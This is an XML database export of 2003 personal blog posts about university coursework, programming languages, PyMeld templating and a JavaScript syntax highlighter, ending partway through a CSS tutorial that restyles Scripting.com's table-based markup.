		<field name="body">&lt;p&gt;I'm all courseworked out. After 4 hours sleep on Saturday night, I got up at 8am, headed in to Uni and spent the next consecutive 57 hours in the Library doing coursework (grabbing a total of about two hours sleep during that time). It was, with hindsight, a very stupid thing to do but I take heart in the fact that I was not alone: At least 20 other people from my course were there for almost the same amount of time I was (see &lt;a href=&quot;http://www.radiac.net/cgi-bin/diary.pl?command=entry&amp;amp;id=616&quot; title=&quot;Not a happy bunny&quot;&gt;Richard&lt;/a&gt; and &lt;a href=&quot;http://blog.mooncalf.me.uk/archive/2003/05/15#Stuff&quot; title=&quot;Stuff&quot;&gt;Andy&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;It would be easy to write this off as critical lazyness, but I've actually been working extremely hard on coursework for the past four weeks. The main problem was that one of our two grou courseworks involved implementing a personal organiser (calendar / todo list / notebook / address book) in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; - just the kind of project that can take as long as you let it if your requirements are overly ambitious. As it was we didn't quite implement everything we wanted to, but the resulting system is good enough for me to have already started using it to organise myself a bit better. Ironically the first thing I used it for was co-ordinating the rest of my coursework.&lt;/p&gt;

&lt;p&gt;Anyway, I've spent the last 2 days catching up on sleep. I also took delivery of Grand Theft Auto: Vice City for PC this morning, a day before the official release date (thanks to Gameplay.co.uk). Unfortunately it refuses point blank to install on my aging PC, complaining of a CRC error. It works fine on my house mate Paul's though. Considering I still have a couple of small courseworks to go (not to mention exams) it's probably a good thing that I haven't got it working.&lt;/p&gt;</field>
		<field name="created">2003-05-15 23:02:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">971</field>
		<field name="title">Ninety percent of everything is crap</field>
		<field name="slug">moreThoughtsOnProgramming</field>
		<field name="body">&lt;p&gt;Via the comments on Robert C. Martin's &lt;a href=&quot;http://www.artima.com/weblogs/viewpost.jsp?thread=4738&quot;&gt;One per Pixel&lt;/a&gt;, I came across &lt;a href=&quot;http://www.pragmaticprogrammer.com/ppllc/papers/1998_02.html&quot;&gt;Sturgeon's Law&lt;/a&gt; from the Pragmatic Programmers: &lt;q cite=&quot;http://www.pragmaticprogrammer.com/ppllc/papers/1998_02.html&quot;&gt;Ninety percent of everything is crap&lt;/q&gt;. The article has the following to say about software development:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.pragmaticprogrammer.com/ppllc/papers/1998_02.html&quot;&gt;
&lt;p&gt;Abstraction is the key to success in designing and programming computer systems. Your favorite programming language should allow you to easily map an abstract problem domain onto the more constrained solution domain of data structures and logic.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This simple message is exactly the point put across in the classic text book &lt;a href=&quot;http://mitpress.mit.edu/sicp/&quot;&gt;Structure and Interpretation of Computer Programs&lt;/a&gt;, which I had to review as part of a recent coursework assignment on the Scheme programming language. The pragmatic programmers article goes on to discuss how todays most popular languages, C++ and Java, do a very bad job of helping to build abstractions: Typing &lt;code class=&quot;java&quot;&gt;public static void main (String[] args)&lt;/code&gt; is hardly the most intuitive way of defining the entry point of a program!&lt;/p&gt;

&lt;p&gt;One of the things I liked most about &lt;acronym title=&quot;Structure and Interpretation of Computer Programs&quot;&gt;SICP&lt;/acronym&gt; was its constant theme that no one language is perfect for any one job, and there is no harm in defining new languages to fit new problem spaces. The Lisp / Scheme / Functional style of programming seems to revolve around building the language up towards the problem, rather than hacking at the problem until it has been expressed in the language.&lt;/p&gt;

&lt;p&gt;I guess what I'm trying to say is that over the past few weeks I've really learnt to appreciate the importance of accepting and studying a wide range of different languages and programming techniques. Just because anything can be written in a language (which should be true of any language that is Turing complete) doesn't mean there aren't more effective ways of solving a problem available if you look elsewhere.&lt;/p&gt;</field>
		<field name="created">2003-05-15 23:14:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">972</field>
		<field name="title">PyMeld</field>
		<field name="slug">pyMeld</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.entrian.com/PyMeld/&quot;&gt;PyMeld&lt;/a&gt; is a concrete implementation of something I've been thinking about for months: A template system that takes an &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; page as a template and manipulates it based on cloning and modifying elements within the template identified using their ID attribute. It's a very elegant solution that makes good use of Python's object overloading support to make manipulating templates as intuitive as possible. Maybe the same thing will be possible in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; once the new &lt;a href=&quot;http://www.php.net/manual/en/ref.overload.php&quot; title=&quot;Object property and method call overloading&quot;&gt;overloading functions&lt;/a&gt; become part of the standard package.&lt;/p&gt;

&lt;p&gt;If you decide to have a play with PyMeld you may run in to the limitation that, because &lt;code class=&quot;python&quot;&gt;class&lt;/code&gt; is a reserved word in Python, you can't set the class of an element using the standard &lt;code class=&quot;python&quot;&gt;page.someElementID.class = &quot;something&quot;&lt;/code&gt; syntax. You can however achieve the same thing using Python's &lt;code class=&quot;python&quot;&gt;setattr&lt;/code&gt; built in function: &lt;code class=&quot;python&quot;&gt;setattr(page.someElementID, 'class', 'something')&lt;/code&gt;. That tip comes courtesy of the module's author who sorted it out for me within about 10 minutes of my email query.&lt;/p&gt;</field>
		<field name="created">2003-05-15 23:24:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">973</field>
		<field name="title">CSS2 is five years old</field>
		<field name="slug">cssTwoIsFiveYearsOld</field>
		<field name="body">&lt;p&gt;No one appeared to notice, but the &lt;a href=&quot;http://www.w3.org/TR/REC-CSS2/&quot;&gt;CSS2 Recommendation&lt;/a&gt; had its five year birthday on Monday the 12th of May. Maybe now people will stop writing it off as a new and unproven technology and start looking in to the benefits it can bring instead. Speaking of which, I've decided on the format for my &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; tutorial series and hope to kick things off with the first in the series tomorrow.&lt;/p&gt;</field>
		<field name="created">2003-05-15 23:28:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">974</field>
		<field name="title">The anatomy of a stylesheet</field>
		<field name="slug">anatomyOfAStylesheet</field>
		<field name="body">&lt;p&gt;To start my series of tutorials, I'm going to go over some of the basics of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. This is the boring bit: if you already know the difference between rules, properties and selectors you may want to skip this entry.&lt;/p&gt;

&lt;p&gt;The basic building block of a stylesheet is the &lt;dfn&gt;rule&lt;/dfn&gt;. A rule is a statement applying one or more properties to one or more elements. The declaration of a rule is split in to two parts; the &lt;dfn&gt;selector&lt;/dfn&gt; and the &lt;dfn&gt;declaration block&lt;/dfn&gt;, which itself consists of &lt;dfn&gt;declarations&lt;/dfn&gt;. Each declaration consists of a &lt;dfn&gt;property&lt;/dfn&gt; and a &lt;dfn&gt;value&lt;/dfn&gt;. Confused by the terminology yet? Don't worry, that's about as complicated as it gets, and I'll be providing a summary of definitions later on.&lt;/p&gt;

&lt;p&gt;Here is an example of a rule:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;h1 {
  color: navy;
  border-bottom: 1px solid black;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the above, h1 is the selector; it specifies the parts of the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; document that the rule should be applied to. In this case, it means &quot;all &amp;lt;h1&amp;gt; elements&quot;. The curly braces mark the declaration block, with the two declarations separated by semi-colons. I've placed the declarations on different lines but this is purely a coding style thing: &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; ignores whitespace as a general rule.&lt;/p&gt;

&lt;p&gt;The meanings of the two declarations should be relatively self evident: &lt;code class=&quot;css&quot;&gt;color: navy&lt;/code&gt; (note the American spelling of &quot;color&quot;) sets the colour of the text to navy blue, while &lt;code class=&quot;css&quot;&gt;border-bottom: 1px solid black;&lt;/code&gt; adds a 1 pixel wide solid black border to the bottom of the element. In fact, this is an example of a &lt;dfn&gt;shorthand property&lt;/dfn&gt; which allows several properties to be set at once.&lt;/p&gt;

&lt;p&gt;There are over 100 properties defined by the CSS2 specification, but they are generally quite straight forward and can be picked up as you go along. Selectors are also straight forward but their importance is often underestimated: in my opinion, understanding them thoroughly is critical to learning to use &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; effectively.&lt;/p&gt;

&lt;h4&gt;Selectors&lt;/h4&gt;

&lt;p&gt;The selector part of a rule specifies which parts of the associated document the rule should be applied to. Selectors are always positioned at the start of a rule before the open curly brace. More than one selector can be specified for a single rule, in which case the selectors must be separated by commas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;/* Make all &amp;lt;h1&amp;gt; and &amp;lt;h2&amp;gt; elements navy blue */
h1, h2 {
  color: navy; 
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The most basic form of selector, demonstrated above, is the element or type selector. It is written as the tag name of an HTML element and matches all elements of that type.&lt;/p&gt;

&lt;p&gt;The next most common selectors are those based on classes and IDs. A class is any string of numbers and letters, starting with a letter - for example, &quot;blogentry&quot;, &quot;nav&quot;, &quot;codeSample&quot;, &quot;row2&quot;. Classes can be assigned to any element within an &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; document using the class attribute. Multiple classes can be assigned to an element by placing a list of classes in the class attribute separated by spaces. For example:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;div class=&quot;blogentry first&quot;&amp;gt;...&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above is the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; for a div that has both &quot;blogentry&quot; and &quot;first&quot; as classes.&lt;/p&gt;

&lt;p&gt;Classes can then be used as part of a selector, by appending a full-stop on to the front of the class name:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;/* Colour anything with class=&quot;blogentry&quot; navy blue */
.blogentry {
  color: navy;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Class selectors can include an element name as well, to limit the application of the rules to specific elements with the specified class:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;/* Colour only divs with class=&quot;blogentry&quot; navy blue */
div.blogentry {
  color: navy;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above piece of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; will change the colour of &lt;code class=&quot;html&quot;&gt;&amp;lt;div class=&quot;blogentry&quot;&amp;gt;&lt;/code&gt;, but will not affect &lt;code class=&quot;html&quot;&gt;&amp;lt;h3 class=&quot;blogentry&quot;&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;ID selectors affect elements with a specific id attribute. IDs are like classes in that they can be applied to any element, but unlike classes any specific ID can only be used &lt;strong&gt;once&lt;/strong&gt; within any single document. Classes can be used as many times as you like. As a result, IDs should be used on page items that occur only once, such as a company logo that appears in the top left hand corner of a page. ID selectors consist of the ID with a # sign preprended on to it:&lt;/p&gt;


&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;/* Position the element with id=&quot;logo&quot; at the top left of the page */
#logo {
  position: absolute;
  top: 0px;
  left: 0px;
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above example would position any element with id=&quot;logo&quot; at the top left of the page, using absolute positioning (which I will cover in detail later in the course).&lt;/p&gt;

&lt;p&gt;As with class selectors, you can include the element name before the hash sign. This may seem unnecessary since only one item on any page can have a specific ID, but I find doing so helps make the resulting stylesheet more readable as it reminds me what type of element the ID is attached to.&lt;/p&gt;

&lt;p&gt;With the basic selectors out of the way, the next most useful selector is the &lt;dfn&gt;descendant selector&lt;/dfn&gt;. This consists of two or more selectors separated by spaces, and has the effect of matching things that match each of the selectors, going from first to last. For example, &lt;code class=&quot;css&quot;&gt;div#main a&lt;/code&gt; matches all links that occur inside &lt;code class=&quot;html&quot;&gt;&amp;lt;div id=&quot;main&quot;&amp;gt;&lt;/code&gt;, while &lt;code class=&quot;css&quot;&gt;div#nav ul.plain li&lt;/code&gt; would match all &lt;code class=&quot;html&quot;&gt;&amp;lt;li&amp;gt;&lt;/code&gt;s occuring inside a &lt;code class=&quot;html&quot;&gt;&amp;lt;ul class=&quot;plain&quot;&amp;gt;&lt;/code&gt; that itself occurs inside &lt;code class=&quot;html&quot;&gt;&amp;lt;div id=&quot;nav&quot;&amp;gt;&lt;/code&gt;. Descendant selectors are extremely powerful, and can often be used in place of a large number of class attributes. In general, if you find yourself using a class attribute on every one of a whole bunch of similar elements you may be able to replace them all with a class attribute on a containing element accompanied by a descendant selector in the stylesheet.&lt;/p&gt;

&lt;h4&gt;Attaching a stylesheet&lt;/h4&gt;

&lt;p&gt;Now that you know what goes in a stylesheet, you need to know how to attach rules to an &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; document. There are two options: &lt;dfn&gt;internal stylesheets&lt;/dfn&gt;, where the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; is included at the top of the page, and &lt;dfn&gt;external stylesheets&lt;/dfn&gt;, where the stylesheet is a separate file. External stylesheets are generally a better bet as they allow a single stylesheet to be shared across multiple pages (dramatically improving download times as the stylesheet can be downloaded once and then cached by the browser), but I will describe both methods here. Here is the code for an internal stylesheet:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;...
&amp;lt;head&amp;gt;
&amp;lt;style type=&quot;text/css&quot;&amp;gt;
h1 {
  color: blue;
}
...
&amp;lt;/style&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; rules are placed within a &lt;code class=&quot;html&quot;&gt;&amp;lt;style&amp;gt;&lt;/code&gt; element within the head section of the document. The &lt;code class=&quot;html&quot;&gt;type=&quot;text/css&quot;&lt;/code&gt; attribute specifies the stylesheet language being used (on the offchance that another stylesheet language is created some time in the future).&lt;/p&gt;

&lt;p&gt;For an external stylesheet, the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; rules are saved in a file with a .css extension (the file extension is not ompulsory but the file should be served with a &lt;code&gt;text/css&lt;/code&gt; content type header, and most web servers are configured to serve .css files using that content type). The &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; to link in an external stylesheet, again placed in the head section, is as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;link rel=&quot;stylesheet&quot; href=&quot;path/to/stylesheet.css&quot; type=&quot;text/css&quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That's all the basic &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; I plan to cover; my next article will start on the core material of the course, which will be a set of case studies showing how existing sites using legacy markup can be dramatically improved through the addition of a little careful &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2003-05-18 23:56:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">975</field>
		<field name="title">Syntax Highlighting with Javascript</field>
		<field name="slug">syntaxHighlighting</field>
		<field name="body">&lt;p&gt;If you were curious enough to dig around the source code of yesterday's &lt;a href=&quot;http://simon.incutio.com/archive/2003/05/18/anatomyOfAStylesheet&quot; title=&quot;The anatomy of a stylesheet&quot;&gt;CSS tutorial&lt;/a&gt;, you may have noticed a couple of classes that didn't appear to be doing anything:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;pre&amp;gt;&amp;lt;code class=&quot;css&quot;&amp;gt;h1 {
  color: navy;
  border-bottom: 1px solid black;
}
&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;

&amp;lt;pre&amp;gt;&amp;lt;code class=&quot;html&quot;&amp;gt;...
&amp;amp;lt;head&amp;amp;gt;
&amp;amp;lt;style type=&quot;text/css&quot;&amp;amp;gt;
h1 {
  color: blue;
}
...
&amp;amp;lt;/style&amp;amp;gt;
...
&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I added the classes in the hope that they would be useful some time in the future. This afternoon, the Internet connection in the University library stopped working so I decided to take the time to play with an idea I've been tossing around for a few weeks. The result: &lt;a href=&quot;http://simon.incutio.com/js/syntaxHighlight.html&quot;&gt;Javascript Syntax Highlighting&lt;/a&gt;. The concept is pretty simple - it grabs the code samples with &lt;code&gt;css&lt;/code&gt; or &lt;code&gt;html&lt;/code&gt; as the class, then uses regular expressions (along with some crafty callback functions) to add &lt;code class=&quot;html&quot;&gt;&amp;lt;span&amp;gt;&lt;/code&gt; elements to specific bits of code to allow them to be highlighted. It works in Firebird / Mozilla but fails pitifully in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5, which appears not to support callbacks from the &lt;code class=&quot;javascript&quot;&gt;string.replace()&lt;/code&gt; function. I haven't tried it in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 6 yet.&lt;/p&gt;

&lt;p&gt;Unfortunately, it relies on the non-standards compliant &lt;code&gt;innerHTML&lt;/code&gt; property which causes it not to work in Mozilla in &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; mode, so I can't deploy it on my blog at the moment. Due to the way the regular expressions work I'm not entirely sure how I can rectify this using standard &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; methods, so I'm leaving it as it is for the moment.&lt;/p&gt;</field>
		<field name="created">2003-05-19 17:09:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">976</field>
		<field name="title">New Gestures Build</field>
		<field name="slug">newGesturesBuild</field>
		<field name="body">&lt;p&gt;There's a new nightly build of the Mozilla &lt;a href=&quot;http://optimoz.mozdev.org/gestures/installation.html&quot; title=&quot;gestures/installation&quot;&gt;mouse gestures plugin&lt;/a&gt; which supports Firebird 0.6 and has a preferences panel, complete with options for setting up custom gestures. I missed the customise button at first (Tools -&amp;gt; Options -&amp;gt; Extensions -&amp;gt; Mouse Gestures -&amp;gt; Settings -&amp;gt; Edit Mappings) but it's very powerful, if slightly confusing. It's nice to be able to change gestures to the right mouse button without digging in to &lt;code&gt;about:config&lt;/code&gt; as well.&lt;/p&gt;

&lt;p class=&quot;img&quot;&gt;&lt;img alt=&quot;The new gesture preferences screen is complex but powerful&quot; height=&quot;510&quot; src=&quot;http://simon.incutio.com/images/2003/mozGestPrefs.gif&quot; width=&quot;634&quot; /&gt;&lt;/p&gt;</field>
		<field name="created">2003-05-19 17:51:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">977</field>
		<field name="title">The Selfish Class</field>
		<field name="slug">theSelfishClass</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.joeyoder.com/papers/patterns/Selfish/selfish.html&quot;&gt;The Selfish Class&lt;/a&gt; provides a set of related patterns to help design software objects that encourage reuse. They seem to make a lot of sense; I've only read a smal part of the paper and I'm already spotting things that are reflected in software I've found reusable in the past. Key example:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.joeyoder.com/papers/patterns/Selfish/selfish.html&quot;&gt;
&lt;p&gt;&lt;strong&gt;Low surface to volume ratio:&lt;/strong&gt; Objects with complex interfaces that conceal few of their internals are hard to understand and reuse. &lt;em&gt;Therefore&lt;/em&gt;, Design objects with low surface to volume ratios, that is, objects with small external interfaces, or surface areas, that encapsulate a large volume of internal complexity.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;That's exactly why I find &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/14/ezPyCrypto&quot; title=&quot;Easy Python Cryptography&quot;&gt;ezPyCrypto&lt;/a&gt; such an attractive class.&lt;/p&gt;</field>
		<field name="created">2003-05-19 21:43:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">978</field>
		<field name="title">Scripting.com, with added CSS</field>
		<field name="slug">scriptingWithCSS</field>
		<field name="body">&lt;p&gt;One of the aims of this course is to show how relatively simple &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; can be used to make dramatic improvements to existing sites. Today, I'll show how &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; can be used to reduce the amount of code needed for a small part of the design of &lt;a href=&quot;http://www.scripting.com/&quot;&gt;Scripting.com&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Scripting.com presents the main blog entries as a series of paragraphs under a single header for each day. Here is a screenshot from today's edition of the site:&lt;/p&gt;

&lt;p class=&quot;img&quot;&gt;&lt;img alt=&quot;Scripting.com entries, in a table based layout&quot; height=&quot;145&quot; src=&quot;http://simon.incutio.com/code/css/scripting/original.gif&quot; width=&quot;411&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; behind the above screenshot is as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;table width=&quot;400&quot; cellspacing=&quot;0&quot; cellpadding=&quot;3&quot; border=&quot;0&quot;&amp;gt;
	&amp;lt;tr bgcolor=&quot;#000000&quot;&amp;gt;
		&amp;lt;td colspan=&quot;2&quot;&amp;gt;&amp;lt;font color=&quot;#F5F5F5&quot;&amp;gt; &amp;lt;b&amp;gt;Monday, May 19, 
2003&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;
		&amp;lt;td valign=&quot;middle&quot;&amp;gt;&amp;lt;font color=&quot;#F5F5F5&quot;&amp;gt; 
&amp;lt;b&amp;gt;&amp;lt;a href=&quot;http://scriptingnews.userland.com/2003/05/19&quot; 
title=&quot;Permanent link to Scripting News archive for Monday, May 19, 2003.&quot;&amp;gt;
&amp;lt;img src=&quot;http://www.scripting.com/images/home/dailyLinkIcon.gif&quot; 
height=&quot;15&quot; width=&quot;12&quot; border=&quot;0&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;
		&amp;lt;/tr&amp;gt;
	&amp;lt;tr bgcolor=&quot;white&quot;&amp;gt;
		&amp;lt;td width=&quot;5&quot;&amp;gt; &amp;lt;/td&amp;gt;
		&amp;lt;td valign=&quot;top&quot;&amp;gt;
			&amp;lt;br&amp;gt;
			&amp;lt;a name=&quot;When:1:11:34PM&quot;&amp;gt;
&amp;lt;a href=&quot;http://icann.blog.us/2003/05/19.html#a1356&quot;&amp;gt;Bret Fausett&amp;lt;/a&amp;gt;: 
&quot;It seems that an article making the rounds on Googlenews -- '.org Registry 
Vanishes Into Thin Air'  -- has no merit whatsoever.  
&amp;lt;a href=&quot;http://scriptingnews.userland.com/2003/05/19#When:1:11:34PM&quot; 
title=&quot;Permanent link to this item in archive.&quot;&amp;gt;
&amp;lt;img src=&quot;http://www.scripting.com/images/2001/09/20/sharpPermaLink3.gif&quot; 
height=&quot;9&quot; width=&quot;6&quot; border=&quot;0&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;

&amp;lt;a name=&quot;When:7:06:28AM&quot;&amp;gt;Guardian: 
&amp;lt;a href=&quot;http://www.guardian.co.uk/online/comment/story/0,12449,959151,00.html&quot;&amp;gt;
The blog clog myth&amp;lt;/a&amp;gt;.  
&amp;lt;a href=&quot;http://scriptingnews.userland.com/2003/05/19#When:7:06:28AM&quot; 
title=&quot;Permanent link to this item in archive.&quot;&amp;gt;&amp;lt;img 
src=&quot;http://www.scripting.com/images/2001/09/20/sharpPermaLink3.gif&quot; 
height=&quot;9&quot; width=&quot;6&quot; border=&quot;0&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I've added some extra line breaks to fit all of the code in the space available, but other than that it's unmodified.&lt;/p&gt;

&lt;p&gt;First, let's reduce the above to the equivalent structural HTML, removing all of the presentational tags and adding in a few that might be useful. We're also going to remove the images - they'll still be there in the final version, but by using background images defined in the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; we can save quite a lot of code.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;div class=&quot;entry&quot;&amp;gt;
&amp;lt;h2&amp;gt;&amp;lt;a href=&quot;http://scriptingnews.userland.com/2003/05/19&quot; 
title=&quot;Permanent link to Scripting News archive for Monday, May 19, 2003.&quot;
class=&quot;permalink&quot;&amp;gt;&amp;lt;span&amp;gt;#&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;Monday, May 19, 2003&amp;lt;/h2&amp;gt;

&amp;lt;p&amp;gt;&amp;lt;a name=&quot;When:1:11:34PM&quot;&amp;gt;&amp;lt;/a&amp;gt;
&amp;lt;a href=&quot;http://icann.blog.us/2003/05/19.html#a1356&quot;&amp;gt;Bret Fausett&amp;lt;/a&amp;gt;: 
&quot;It seems that an article making the rounds on Googlenews -- '.org Registry 
Vanishes Into Thin Air' -- has no merit whatsoever. 
&amp;lt;a href=&quot;http://scriptingnews.userland.com/2003/05/19#When:1:11:34PM&quot; 
title=&quot;Permanent link to this item in archive.&quot; class=&quot;permalink&quot;&amp;gt;&amp;lt;span&amp;gt;#&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;

&amp;lt;p&amp;gt;&amp;lt;a name=&quot;When:7:06:28AM&quot;&amp;gt;&amp;lt;/a&amp;gt;Guardian: 
&amp;lt;a href=&quot;http://www.guardian.co.uk/online/comment/story/0,12449,959151,00.html&quot;&amp;gt;
The blog clog myth&amp;lt;/a&amp;gt;. 
&amp;lt;a href=&quot;http://scriptingnews.userland.com/2003/05/19#When:7:06:28AM&quot; 
title=&quot;Permanent link to this item in archive.&quot; class=&quot;permalink&quot;&amp;gt;&amp;lt;span&amp;gt;#&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;

&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A few notes about the above. First, I've wrapped the whole entry in a div with the class &quot;entry&quot;. This means I can use descendant selectors to style the other elements in the block qithout needing to add additional classes. The only classes I've added are the permalink classes on the various permalinks - these will be used in a moment. Note also that the '#' signs in the permalinks have a span tag around them. The reason for this will become apparent in a moment. The table used for the header has been replaced with a structural h2 tag. Header tags should be applied in order, with the most important header on the page using h1 and the other headers being used for sub headers, sub-sub headers and so on. I'm assuming that h1 would be used for the site title (or logo) so I'm using h2 in this example.&lt;/p&gt;

&lt;p&gt;The unstyled HTML can be seen &lt;a href=&quot;/code/css/scripting/stripped.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now let's style it with some &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. First up, Scripting.com's main layout table is 400 pixels wide. We can emulate that by applying a width to our &amp;lt;div&amp;gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;div.entry {
  width: 400px;
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now let's concentrate on the header. The date header on Scripting.com has a black background with white text. The text is bold, and is displayed at the same size as the body text of the rest of the site. In &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, relative sizes can be specified using the em unit. 1em means 1 times the current text size, so we'll set the font-size to 1em. Finally, the header is padded with about 3 pixels on every side. Here's the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;h2 {
  background-color: black;
  color: white;
  font-size: 1em;
  font-weight: bold;
  padding: 3px;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;See the result &lt;a href=&quot;/code/css/scripting/header1.html&quot; title=&quot;First styles applied to the header&quot;&gt;here&lt;/a&gt;. So far, so good - but what about the funky permalink? It's an image, and it appears over on the right. Normally this would be a sign that we need a table, but we can achieve the same effect in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; using the float property. Floats are actually one of the hardest properties to fully understand, but if you've ever used the align attribute on an image you should have a good idea of what they do. We will use &lt;code class=&quot;css&quot;&gt;float: right&lt;/code&gt; on the permalink to cause it to shfit as far right as possible, appearing next to the main header text.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;
h2 a.permalink {
  float: right;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But what about the image? Here's where things get tricky. We're going to use a technique called the &lt;a href=&quot;http://www.stopdesign.com/log/default.asp?date=20030314&quot; title=&quot;More on Background-Image, I&quot;&gt;Fahrner Image Replacement&lt;/a&gt;. This is what the extra spans are for - we can apply a background image to the a element, then make the contents of the span invisible using &lt;code class=&quot;css&quot;&gt;display: none&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;h2 a.permalink {
  float: right;
  width: 12px;
  height: 15px;
  background-image: url(&quot;dailyLinkIcon.gif&quot;);
}
h2 a.permalink span {
  display: none;
}
&lt;/code&gt;&lt;/pre&gt;

